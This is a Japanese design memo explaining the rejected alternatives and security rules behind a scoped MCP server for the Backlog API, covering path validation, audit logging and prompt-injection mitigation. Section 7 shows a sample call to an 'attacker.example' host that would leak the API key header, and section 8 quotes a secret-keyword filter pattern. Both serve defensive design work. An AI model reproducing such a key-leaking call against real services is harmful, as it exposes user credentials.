# 設計メモ

`README.md` は「何を・どう使うか」と、個々の決定の理由を書く。
**このファイルが書くのは「なぜ、その形以外を採らなかったか」。**

使い方は README を見ること。ここでは重複させない。

**この文書が要る理由**: この設計は対話で決まった部分が大きく、結論だけがコードと README に
残っている。**捨てた案は、捨てた理由ごと残さないと必ず再提案される。**

---

## 1. 存在理由 — Backlog に無い層を補う

Backlog の API キーは**発行ユーザーの全権限**で届く。Backlog 側に「このプロジェクトだけ」を
表現する手段は、ユーザーの権限設定しかない。

> **このサーバの役割は、Backlog が提供していないスコープ層を補うこと。**

**脅威駆動（「データが機密だから絞る」）ではなく、責務駆動で設計する。** 権限と範囲を管理するのが
このコンポーネントの仕事である、という立て方。だから「機密でないから緩めてよい」にはならないし、
逆に「攻撃者を想定していないから何もしなくてよい」にもならない（脅威モデルは §8）。

公式の [`nulab/backlog-mcp-server`](https://github.com/nulab/backlog-mcp-server) を fork も
プロキシもしない。**絞り込みは後から足せる性質のものではない**（ツール面が先にあると、
「全部あるものから引く」設計になり、書き忘れが広い方向に転ぶ）。

---

## 2. 4つの原則

README は原則2と原則4を個別に説明しているが、**この4つは1つの判断基準**である。
新しいツールを足すときは、まずこの4つに掛ける。

### 原則1 — 絞り込みパラメータはポリシー由来で組み立てる

「引数を検査して拒否する」ではなく、**「その値を作れる口を用意しない」**。

`search_issues` の `projectId[]` は `scopedProjectIds()` の戻り値で、引数から受け取る経路が
存在しない（`src/tool/tools.ts`）。検査を書き忘れる余地が無いので、**テストは「拒否されること」
ではなく「そもそも到達しないこと」を確かめる**形になる。

この形は api 層の入口を `ResolvedRequest` 1つに絞ったことで成立している。当初案の
`get` / `post` 2口をやめた結果、**input 段が組み立てたリクエストしか送れない**。
副産物として、境界テストの大半が I/O 抜きの純関数テストになった。

### 原則2 — 数値 ID しか受けないエンドポイントのツールは作らない

`GET /wikis/:wikiId` のように、プロジェクトをローカルで判定できない経路にはツールを作らない。
Backlog の ID は連番なので、引数で受けると総当たりが効く。

> **この原則には一度、誤った前提が乗っていた。** 「Wiki は一覧経由で到達させる」としていたが、
> 一覧は `content` を返さない（ミラーで確認）。**到達先が無かった。** 原則2 の判断自体は正しく、
> 間違っていたのは「一覧経由で到達できる」という前提のほう。解決は原則4 で行った（README 参照）。

### 原則3 — 3軸で表現できない操作は載せない

ツール面はポリシーのモデルから**落ちてくる**。載せるものを選んでいるのではない。

落ちるもの: 数値 ID 専用の経路すべて / `GET /space/activities`（スペース直下なのでプロジェクトで
絞れない。`GET /projects/:projectIdOrKey/activities` は残る）/ `GET /space` / `GET /users` /
添付アップロード単独 / **削除系すべて**（issues 5・projects 11・wikis 3・documents 2・git 1）。

**削除がポリシーの語彙（`read` < `comment` < `write`）に存在しないのは意図的。**
どう書いても表現できないので、「うっかり許可する」が起こらない。

### 原則4 — 数値 ID を LLM に触らせない

入力は名前で受け、ID はサーバ内で解決して留める。

```
✗ create_issue(projectId: 123, issueTypeId: 456, priorityId: 3)
✓ create_issue(projectKey: "PROJ", issueType: "バグ", priority: "高")
```

`priorities` / `resolutions` はスペース直下なので原則3 で落ちるが、これが無いと課題が作れない。
→ **起動時に内部マスタとして解決し、ツールとしては公開しない。**

出力側にも同じ規律を掛ける。**返した値が別の操作への入口にならないこと。**
Electron が「コールバックに `IpcRendererEvent` を渡すな」と言うのと同型で、
`event.sender` から `ipcRenderer` に到達できるのと同じことが、連番 ID でも起きる。

---

## 3. ポリシー — 3軸を正規形へ畳む

| 軸             | キー       | 必須 | 省略時 | 方向                             |
| -------------- | ---------- | :--: | ------ | -------------------------------- |
| **どこ**       | `projects` |  ✔   | —      | 列挙のみ。**ワイルドカード無し** |
| **どの機能**   | `toolsets` |      | 全部   | 絞る                             |
| **何ができる** | `can`      |      | `read` | 3段の単一値                      |

`can` を列挙（`["read","write"]`）にしないのは、`["write"]` との差が曖昧になるため。

### なぜ正規形にするか

```
( can ∪ preset₀ ∪ preset₁ … ) ∩ toolsets   →   Set<(projectKey, toolName)>
```

`can` / `toolsets` / 将来の `preset` は**どれも同じ集合への畳み込み**であって、`can` だけが
特別ではない。集合演算として書けば「広げる」「絞る」が演算子の名前になり、覚えるべき規則が減る。

得られるもの:

- **監査ハッシュを正規形に対して取れる。** 書き方をリファクタしても権限が同じならハッシュが同じ。
  逆に**ハッシュが変われば必ず権限が変わっている**（`src/policy/policy.ts` の `hashScopes`）
- **テストの責務が割れる。** policy 層は「記法 → 集合」、tool 層は「集合を持つか」だけ
- `tools/list` とハンドラが**同じ集合を参照する**のでズレようがない
- 将来 Backlog 側にスコープができたら移行できる（肩代わりしていることが構造に残る）

**正規形はポリシーに書けなくする。** 内部表現であって記法ではない。デバッグ用に読めるだけ
（読めるが書けない）。ポリシーで権限を「作れる」ようにすると、絞るための仕組みが反転する。

---

## 4. 層と語彙 — 1プロセスの境界を lint で作る

| 層                        | 知ってよい                                            | 知ってはいけない     |
| ------------------------- | ----------------------------------------------------- | -------------------- |
| `contract.ts`             | 型だけ（import ゼロの葉）                             | —                    |
| `shared/`                 | 言語機能だけ（`assertNever` / `toError` / freeze）    | ランタイム依存       |
| `policy/`                 | projectKey, toolName, can, toolset                    | エンドポイント, HTTP |
| `domain/`                 | projectKey, issueKey, 「バグ」「高」などの名前        | MCP, スコープ        |
| `tool/`                   | tool 名, inputSchema, annotations, content, untrusted | HTTP, status code    |
| `mcp/`                    | JSON-RPC, stdio, 監査レコード                         | Backlog              |
| `libs/`（借り物の生成物） | URL, method, headers, status, `/api/v2/…`             | MCP, ポリシー        |

**policy と domain の両方を知るのは、各ツールの input 段だけ。** Electron の preload と同じ役どころで、
そこ1箇所に閉じ込める。

**Electron の3プロセス分離が効くのは、プロセス境界が構造的に語彙を分けるから。** preload は DOM を
知らず、renderer は `fs` を知らない。努力しなくても分かれている。**MCP サーバは1プロセスなので
この強制が無い。** だから `eslint.config.js` の `no-restricted-imports` に層ごとの `group` を置いて
代替している（`src/tool/**` から `**/libs/**` を禁止、など）。

規約 §8.2 が「人間が守る」に分類していた境界の規律を、**一部だけ機械強制側へ持ってきている**。

### 命名 — 層をまたいで同じ語を使わない

policy 層のプロジェクトは `projectKey`（文字列）、api 層のプロジェクトは `projectId`（数値）。
**どちらも `project` と呼ばない。** 略すと、どちらの層の話かが読めなくなる。

### `src/libs/` はコピーではなくコンパイル

借り物（`aokazaki-olp/libraries`）は**旧規約のままが正しい**。新規約を持ち込むと全モジュールの
改修になるので、上流に合わせろとは言わない。ただし素朴にコピーすると2つ落ちる。

1. パラメータプロパティを使っており、Node の型注釈除去では実行できない
2. 相対 import が `.js` なので、実ファイルが `.ts` だと解決できない

**どちらもコンパイルすれば消える。** `tsconfig.libs.json` で `.js` + `.d.ts` を生成し、それを
import する。出力後は `.js` が実ファイルなので、lint の「相対 import の `.js` 禁止」も
ここだけ例外にしてある（規約の趣旨は「実ファイルの拡張子を書く」）。

規約 §1.3（適用範囲は実行モデルで決める）・§8（実行モデルごとに設定を分ける）どおりの姿で、
`src/libs/` だけが「コンパイルを通す実行モデル」に属する。

---

## 5. 検討して捨てた案

**再提案されやすいものから並べる。**

| 案                                                 | 捨てた理由                                                                                                                                                                                                                                                                     |
| -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`projects` のワイルドカード / `all`**            | 「設定を書くのが面倒」を勘定に入れると、ワイルドカードは**面倒くささが危険側に働く**。列挙しかできなければ、面倒な人は書き込みを諦めて `read` に落ちるしかない                                                                                                                 |
| **deny リスト**（Deno の `--deny-*`）              | Deno に deny があるのは `--allow-read` のような広いカテゴリが書けるから。こちらは必須列挙でワイルドカードが無く、**抜く対象が存在しない**。しかも deny は「書き忘れると広い」方向                                                                                              |
| **git remote からプロジェクトキーを導出**          | Backlog の git URL はキーを含む（`https://xx.backlog.jp/git/BLG/app.git`）が、**クライアントが git 連携前提とは限らない**                                                                                                                                                      |
| **`boundTo` でポリシーが適用範囲を宣言**           | 書くこと自体が面倒の追加で、「面倒くささを安全側に」と矛盾する                                                                                                                                                                                                                 |
| **`preset` / `role`**                              | `pr-reviewer`（issue は read、git は comment）のように **toolset ごとに `can` が違う**ものは3軸で表現できないので、将来は価値がある。ただし Rule of Three — **同じ組み合わせを3回書いた実績が出てから**名前を付ける                                                            |
| **汎用ツール**（`backlog_api_call(...)`）          | Electron の「生の `ipcRenderer.on` を渡すな」と同じ。**IPC イベント系全体への到達**を与えるのと同型で、スコープの意味が消える                                                                                                                                                  |
| **ログのフレームワーク**（pino 等）                | 監査と診断は**要求が正反対**（レベル: 不要/必要、落としてよいか: 絶対だめ/よい、書き込み: 同期/非同期でよい）。1つに載せると `LOG_LEVEL=error` で**監査が黙って消える**経路ができ、絞る方向の設定がここだけ危険側に働く。そもそもチャンネル2本は `AuditSink` を2つ持てば足りる |
| **監査ログの既定を `/tmp` に**                     | systemd の既定で**10日後に消える**（`tmpfiles.d` の `q /tmp 1777 root root 10d`）。OS が定期的に消す場所に置いた監査ログは監査ログではない。加えて `1777` は全ユーザー書き込み可                                                                                               |
| **OS の状態ディレクトリ**（`XDG_STATE_HOME` 等）   | プラットフォーム分岐が要るうえに、「ポリシーの隣」より説明が長くなる                                                                                                                                                                                                           |
| **CI を置く**                                      | 一度置いたが**撤回**（ユーザーの判断）。規約 §8.3 の「ローカルと CI で同じものを実行する」は満たさないことになるので、`AGENTS.md` に「CI は無い。手元の `npm run check` が唯一の関門」と明記して**満たしていないことを書いた**                                                 |
| `istextorbinary` / `is-path-inside` / glob 系      | 中身を見ない／`path.relative` 3行で足りる／組み込み（`fs.glob`・`path.matchesGlob`）で置換可。**`is-path-inside` は TOCTOU の構造を作れない**のが決め手                                                                                                                        |
| **設定ファイルを名前や拡張子で拒否する**           | `BACKLOG_ENV_FILE` などのパスは利用者が決めるので、`secrets.json` と名付ければ allowlist を通る。**指しているファイルそのものを識別（`dev` / `ino`）で拒否する**                                                                                                               |
| **監査ログを glob（`logs/**/*.jsonl`）で拒否する** | 出力先の名前に `[` が入るだけでパターンが**黙ってマッチしなくなる**（`logs[1]` で確認）。ガードが外れたことを誰も言わないので §5.4 の形。判定はルート配下と同じ `isInside` に寄せ、**拡張子でも絞らない**（出力の形を変えたときにガードだけ静かに外れる）                      |
| **識別の照合だけで済ませる**                       | 設定ファイルを**コピーして別名にすれば**識別は別物になり通り抜ける。**中身（sha256）でも照合する**。サイズが一致したときだけハッシュを取るので、ふつうの添付では読みに行かない                                                                                                 |
| **拒否をパス文字列の比較で行う**                   | Windows はパスの大文字小文字を区別せず、8.3 短縮名でも同じファイルを別の文字列で指せる。**開いたハンドルの識別**なら取り逃がさず、TOCTOU の隙も無い                                                                                                                            |
| **アップロードを単独ツールにする**                 | `attachmentId` が LLM の手に渡ると「上げたファイルを別プロジェクトの課題に貼る」経路ができる。**サーバ内で上げてそのまま貼る**（数値 ID を触らせないのと同じ形）                                                                                                               |
| **`fileTypeFromFile` でマジックバイトを見る**      | **パスを開き直すので TOCTOU の穴になる。** 検証したハンドルから読んだバイト列を `fileTypeFromBuffer` に渡す                                                                                                                                                                    |
| **添付ルートに既定を置く**                         | 置いた瞬間に「どこが読めるか」が暗黙になる。MCP 2026-07-28 で `roots` が非推奨になり（SEP-2577）クライアントから受け取る道も無いので、**設定で明示する以外に安全な決め方が無い**                                                                                               |
| **関連課題を `issueId`（数値）で受ける**           | 原則4 に反する。課題キーで受けて `GET /issues/:key` から `id` を採る。**その課題のプロジェクトもポリシーで確認する** — 覆っていないプロジェクトへ読みに行かない                                                                                                                |
| **書き込みで数値 ID を受ける**                     | `POST /issues` の必須は全部 ID だが、受けると原則4 が崩れる。**起動時にマスタを解決して名前で受ける**（`priority` / `resolution` で既にやっている形の拡張）                                                                                                                    |
| **全プロジェクトのマスタを起動時に引く**           | プロジェクト単位のマスタは5本ある。read しか無いプロジェクトのぶんまで引くと、使わない呼び出しが起動時に並ぶ。**`can: "write"` を許したものだけ**に絞る                                                                                                                        |
| **同名ユーザーを先勝ちで解決する**                 | 表示名は一意ではない。黙ってどちらかを選ぶと**別人に割り当てる**（規約 §5.4）。表示名では引けなくして、ログイン名で指すよう返す                                                                                                                                                |
| **`.ts` のまま配る**                               | Node が `node_modules` の下では型注釈除去をしないので**動かない**（実行時に `ERR_UNSUPPORTED_NODE_MODULES_TYPE_STRIPPING`）。clone して使う分には `.ts` 直接実行のままでよい                                                                                                   |
| **`private: true` を外す**                         | `npm pack` はこのままで動く。外すと公開レジストリへ `npm publish` できてしまうので、**事故防止として残す**                                                                                                                                                                     |
| **HTTP トランスポート**                            | stdio 一本にした時点で DNS rebinding とクライアント間漏洩（§7）が構造的に該当しなくなる                                                                                                                                                                                        |
| **絞り込みの `count` をそのまま API へ渡す**       | API は必ず `count` 件までしか返さないので、**「打ち切ったか」の判定が成立しえない**。実際に削っているのは API 側で、そこを見ないと打ち切りを黙って成功として返す（規約 §5.4）。**返したい数より1件多く要求する**（`probeCount`）。余分な1件は捨てる                            |

---

## 6. MCP 仕様の側の制約

現行リビジョンは **2026-07-28**。**仕様に権限モデルは無い**（`schema.ts` 全文で `toolset` 0件・
`grant` 0件・`scope` は `cacheScope` の2件のみ）。権限は Authorization 仕様（OAuth 2.1）側にあり、
HTTP トランスポート向け。**stdio でやる以上、スコープは自分で作るしかない。**

| 仕様の事情                          | こちらへの影響                                                                                                                                                                        |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ToolAnnotations` が唯一の近いもの  | `destructiveHint` の既定が `true` なので**全ツールに付ける**。ただし仕様自身が「保証ではない、クライアントは untrusted として扱え」と言うので、**annotations に依存した防御はしない** |
| **`roots` 非推奨**（SEP-2577）      | 「触っていいディレクトリ」をクライアントから貰う道が塞がれた。**添付の root は必須設定にするしかない**                                                                                |
| `server/discover` の `instructions` | 「LLM のツール理解を助ける自然言語ガイダンス」と定義されている。**untrusted の扱いを書く場所が仕様側にある**                                                                          |
| stdio の `stderr`                   | 「クライアントは capture / forward / **ignore** してよい」。だから監査ログの出口を stderr だけにできない                                                                              |

Tool Annotations Interest Group が `unsafeOutputHint` / `secretHint` / `trustedHint` を検討中
（狙いは lethal trifecta）。**仕様に入ったら自前の `<untrusted>` から乗り換える対象。**

---

## 7. CVE から採った規律

GitHub Advisory Database（npm）で確認したもの。NVD / OSV は egress でブロックされたので
npm エコシステム限定で、PyPI / Go 側は未調査。

| 観測                                                                                    | 採った規律                                                                                                                            |
| --------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| **最多カテゴリがコマンドインジェクション**                                              | `child_process` を**全域で import 禁止**（lint）。Deno の「`--allow-run=deno` は権限モデル全体を無効化する」と同じ議論                |
| `server-filesystem` の **prefix matching + symlink バイパス**（CVE-2025-53109 / 53110） | パス検証は `realpath` → `path.relative` の順。**`startsWith` 禁止**（`/repo` と `/repo-evil`）。検証したハンドルを離さない（`using`） |
| `@anthropic-ai/claude-code` の**ドメイン検証バイパス**（CVE-2026-24052）                | **URL を受け取らない。** env はスペースID だけで、接続先はこちらが組み立てる。危険な値が設定として表現できない                        |
| SDK の**インスタンス使い回しでクライアント間漏洩**（CVE-2026-25536）                    | 1プロセス1ポリシー。**セッション途中でスコープを変えるツールを作らない**（Deno の「同じスレッドのコードは同じ権限」）                 |
| DNS rebinding（CVE-2025-66414）                                                         | `StreamableHTTPServerTransport` の話。**stdio 一本にした時点で該当しない**                                                            |

**「URL を受け取らない」は借り物の穴への対処でもある。** `BacklogApiClient.create()` の
`spaceUrl` 検証は `typeof string && !== ''` だけで、`create('http://attacker.example', { apiKey })`
が通り、`Backlog-API-Key` ヘッダごと任意ホストへ送信される。**こちら側で URL を組み立てる形にすると、
libraries を直さなくても MCP サーバは安全になる**（上流の是正は別件として残る）。

---

## 8. 脅威モデル — 攻撃者ではなく不注意

**このサーバに攻撃者は想定していない。** インハウス利用・非公開で、API キーを読める相手は
そもそもキーを持っている。**桁違いに起きやすいのは、人間と AI の不注意による露出のほう。**

この立場から出ている決定:

- **API キーを env から締め出した。** 環境変数は LLM のコンテキストに入り込みうるし、
  `.mcp.json` は除外を忘れると追跡される。暗号文と秘密鍵を別の場所に置くのは手段で、
  **「暗号化したから安全」ではない**（秘密鍵は同じディスクに平文でいる）
- **セットアップ手順から平文のコマンドを消した。** シェル履歴に残る。PSReadLine には
  `password|asplaintext|token|apikey|secret` を除く仕組みがあるが、**`BACKLOG_API_KEY` は
  どれにも当たらない**（`apikey` にアンダースコアが無い）
- **パーミッションを保護として数えない。** Windows では `mkdir` の `mode` が効かず、`chmod` は
  書き込み可否しか変えられない（Node 公式ドキュメント）。**分けるのは置き場所で行う**

**プロンプトインジェクションも同じ枠で扱う。** `<untrusted>` の囲みは緩和であって防御ではなく、
効くのは「ツール面を絞って被害の上限を下げる」「監査ログで検出可能にする」の2つ
（詳細は README）。**囲みを「対策済み」として数えない。**

**ただし「気休め」でも、自分で壊さないことは要る。** 囲みの `source` には第三者が書いた文字列が
入る（Wiki のページ名・Git リポジトリ名・ドキュメントのタイトル）。実スペースで
`backlog:document:ドキュメント機能へようこそ:title` を見て気づいた穴で、`"` や改行を含む
タイトルなら属性が壊れる。**呼び出し側5箇所ではなく `wrapUntrusted` の中で落とす** — そこが
境界だから（規約 §1.1）。許可した文字だけを残す（拒否リストにしない）。
**本文の側は落とさない**（そちらは囲むのが仕事で、書き換えるのは仕事ではない）。

**長さで削る側も型で決める。** 最初は組み上がった1本の文字列を末尾で切っていたが、実データで
`backlog:document:…:t…` / `…:c…` になり、**項目名の側が消えていた**（`title` と `content` が
1文字差）。1本の文字列では「どこが第三者由来か」を型が知らないので、末尾を切るしかない。
そこで `source` を `{ subject, name, field }` に割った。**第三者が書ける文字列を入れてよいのは
`name` だけ**という契約が型に載り、削るのもそこだけになる。末尾保存の小細工では、項目名の無い
`source` を書く呼び出し側が現れた瞬間に**逆向きに壊れる**（untrusted な側が残る）。

---

## 9. 未解決・既知の穴

**次に触る人が最初に踏むもの。**

> **`toolsets` の未実装4語はここから外れた**（実装 3・削除 1）。ミラーを読んだ結果:
> `git` / `document` / `activity` はプロジェクトで絞れるので**実装した**。`notification` は
> `GET /notifications` に絞り込みパラメータが無く、**3軸で表現できないので語彙から削除**した
> （原則3）。以後は「語彙にある語はすべてツールを持つ」ことをテストで固定してある。

> **`customFields` の要素のキー名はここから外れた**（2026-09-06 に実データで決着）。
> 仕様書だけで決められなかった唯一の項目で、**推測で書かずに件数だけ返して待った**判断が
> そのまま正解だった。決着後の内容は README を見ること。

> **`file-type` の挙動はここから外れた**（2026-09-05 に実機確認、22.0.2）。テキスト系5拡張子は
> 空ファイル・BOM つき・HTML でも `undefined` を返した。**ただし中身が `<?xml` で始まると
> `xml` と判定される** — 「判定不能だけを許す」設計だと正当なテキストを弾くので、許容する型として
> 名前で挙げてある。詳細は README。

> **ミラーは網羅している。** `docs/reference/api/` は152エンドポイント + 8つのガイドを丸ごと持つ
> （2026-08-30 取得、コミット済み）。**下の「無い」はミラーの欠落ではなく、Backlog の API
> ドキュメントにそもそも書かれていない**という意味。取り直しても出てこないので、
> `tools/backlog-docs/fetch.sh` を回すのは Backlog 側の更新に追随するときだけでよい。

### API ドキュメントに書かれていないもの（取り直しても出てこない）

| 項目                               | 状況                                                                                                                                                                                                              |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 活動種別 ID（1〜49）と名前の対応表 | パラメータの説明が `type(1-49)` と書くだけで、対応表はどこにも無い（`get-project-recent-updates` / `get-user-recent-updates` / webhook 系のいずれにも）。**`list_project_activities` は番号のまま返すのが正しい** |
| Backlog の `roleType` 列挙値       | レスポンス例に数値が出るだけ。**出力には載せない**（`pickName` しか通さない）ので、必要になる場面が今は無い                                                                                                       |
| スペースID の形式                  | **API ドキュメントではなくサポートサイトの話**（`support-ja.backlog.com`）。この環境から出られない。DNS ラベル検証で安全側に倒してあるので実装は止まらない                                                        |

### 実データで見つかったもの（2026-09-06、18ツール中16本を通した）

| 見つかったもの                                                                                              | 対処                                                                                                                         |
| ----------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| **`childIssueSummary` が到達不能**（`pickString` でオブジェクトを読み、かつ `expand[]` を送っていなかった） | `expand[]` を送り、`{ total, closed }` として読む。子のいない課題にも `total: 0` が付くので、0 なら出さない                  |
| 検索の絞り込みが `keyword` / `count` だけで、**`offset` が無く21件目以降へ到達できない**                    | 状態・担当者・期限・並び順・`offset` を開いた。名前で絞るときは `projectKey` を必須にする（ID がプロジェクトごとに違うため） |
| **選べる名前を知る手段が無く、必ず1往復捨てる**                                                             | `list_project_masters`（API へ行かない）                                                                                     |
| **`Masters.myUserId` が死んでいた**（解決しているのに参照が無い）                                           | `assignedToMe` で使う                                                                                                        |
| 小文字の課題キーに「数値 ID は受け付けません」と返していた                                                  | 理由ごとに言い分ける                                                                                                         |
| **`list_project_masters` の `assignees` で人数が二重に見える**（表示名とログイン名が別々の要素として並ぶ）  | `ProjectMasters.members`（1人1件の `{ name, loginName }`）を足し、出力はそちらを使う                                         |

**この5件（+1）は、どれも「型は通るが到達しない」形の穴だった。** 単体テストが緑だったのは、テストが API の実際の応答ではなく `pickString` の振る舞いを固定していたため。**実スペースを通さないと出ない種類**なので、次に機能を足すときも同じ手順を踏む。

最後の1件は毛色が違う。**壊れてはいないが、読み手が数を数えると誤る**という形の穴で、`userIds` が「表示名でもログイン名でも引ける」ために両方をキーに持つ設計（これ自体は正しい）がそのまま出力に漏れていた。**内部の索引と、人に見せる一覧は別物**として持つ。

### 追試で確定したこと（2026-09-06）

| 論点                                         | 結論                                                                                                                                                                                                                                      |
| -------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`get_issue` は `expand[]` を受け付けるか** | **受け付けない。** `expand[]` / `expand` / 不正な値 / 無しの4通りすべてでキーが存在せず、**不正な値でもエラーが返らない**（＝パラメータごと無視されている）。一覧側は同じ値で動くので組み立ての問題ではない。ミラーに記述が無いことと一致 |
| `childIssues` の見え方                       | 中間階層（SALES-15）が `hasParent: true` と `{total:1, closed:0}` の両方を持つ。子のない課題では項目ごと消える                                                                                                                            |

**したがって、単体取得に子課題の件数を足す手段は Backlog API 側に存在しない。** `shapeIssue` を一覧と単体で分ける必要も無い（単体では項目が来ず `undefined` になって落ちる）。

### 実データでしか決まらないもの

**空になった。** 最後に残っていた「ドキュメント一覧の `plain` が本文の全文か」は実スペースで確認した — 約1,300文字のドキュメントが末尾まで `plain` に入っており、切り詰めは無かった。ミラーの応答例は一覧・単体とも同じ短い値だったので、これだけは実データを見るまで決まらなかった。

---

## 10. 次段階と、その順序

1. **`preset`** — Rule of Three の3回目が出てから

> **配布は済んだ**（`npm pack` した tgz を `npx --package=<tgz> backlog-mcp` で使う）。
> **ビルドは選択ではなく必須だった** — Node は `node_modules` の下にある `.ts` を
> 型注釈除去しない（`ERR_UNSUPPORTED_NODE_MODULES_TYPE_STRIPPING`。手元で確認）。
> `npx` で入れたものは必ず `node_modules` に置かれるので、`.ts` のままでは配れない。

> **`write` 系は済んだ**（`create_issue` / `update_issue`）。原則4 のとおり全項目を名前で受け、
> **`can: "write"` を許したプロジェクトだけ**プロジェクト単位のマスタ5本を起動時に引く。
> 担当者の表示名が重複する場合は表示名で引けなくし、ログイン名で指すよう返す
> （黙って先勝ちにすると別人に割り当てる）。

> **添付は済んだ。** コメント2つが任意で `file` を取る形にした（アップロード専用ツールは作らない）。
> 残っているのは**複数添付**で、借り物の `ApiClient` がフォームのスカラー配列を弾くため上流の
> 修正が要る。**1件で足りているうちは触らない**（上流は旧規約のままが正しく、触る回数は
> 少ないほどよい）。`notifiedUserId[]` も同じ制約に当たるが、**そもそも LLM に通知先を
> 決めさせない**方針なので使わない。

> **PR レビュー投稿は済んだ**（`add_pull_request_comment`）。**行ごとのコメント API は
> 存在しない**ので（パラメータは `content` / `attachmentId[]` / `notifiedUserId[]` の3つだけ）、
> 1レビュー = 1コメントで本文に `src/main.ts:42` 形式の参照を書く。添付は 1 の段で足す。

**この順にするのは、1 が型システムの外側（ファイルの中身）を扱う唯一の層だから。**
先に済ませておくと、以降は既存の純関数テストの形に収まる。

なお `contract.ts` の `FormFields` は `readonly FormValue[]`（スカラーの配列）を許すが、
借り物の `ApiClient.splitFormFields` は**スカラーの配列を `TypeError` で弾く**（通るのはファイルの
配列だけ）。今のツールは `content` しか送らないので当たらないが、**2 の `notifiedUserId[]` /
`attachmentId[]` はまさにこれ**なので必ず当たる。対処は `FormFields` をスカラーだけに狭めること
（型と実行時が今すぐ一致し、上流に手を入れる判断を先送りできる）。
